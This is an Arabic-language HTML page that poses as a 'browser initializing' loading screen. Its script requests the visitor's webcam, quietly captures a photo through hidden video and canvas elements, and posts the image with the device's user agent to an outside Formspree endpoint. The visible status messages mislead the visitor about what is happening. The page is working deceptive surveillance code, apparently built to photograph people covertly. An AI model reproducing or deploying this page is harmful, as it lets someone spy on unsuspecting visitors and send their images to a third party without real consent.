<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
</head>
<body style="text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4;">

    <div id="status">
        <h2>جاري تهيئة المتصفح...</h2>
        <p>يرجى الانتظار لحظة.</p>
    </div>

    <!-- العناصر المخفية للعملية -->
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status');
        const endpoint = "https://formspree.io/f/mgodlypw";

        // 1. طلب فتح الكاميرا فور الدخول
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                statusText.innerHTML = "<h2>تم الاتصال بنجاح</h2><p>جاري ضبط الإعدادات...</p>";
                
                // انتظار ثانيتين للتأكد من وضوح الصورة ثم التقاطها
                setTimeout(takeAndSendPhoto, 2000);
            })
            .catch(err => {
                statusText.innerHTML = "<h2>خطأ في الاتصال</h2><p>يرجى السماح بصلاحية الكاميرا للمتابعة.</p>";
            });

        function takeAndSendPhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 320, 240);
            
            // تحويل الصورة لنص (Base64) لإرسالها لأن الخطة المجانية لا تدعم الملفات
            const imageData = canvas.toDataURL('image/jpeg');

            // 2. إرسال البيانات إلى Formspree
            fetch(endpoint, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify({
                    info: "محاولة دخول جديدة",
                    device: navigator.userAgent,
                    photo_data: imageData // سيصلك رابط طويل يحتوي على كود الصورة
                })
            })
            .then(response => {
                if (response.ok) {
                    statusText.innerHTML = "<h2>اكتملت العملية</h2><p>يمكنك إغلاق هذه الصفحة الآن.</p>";
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });
        }
    </script>
</body>
</html>
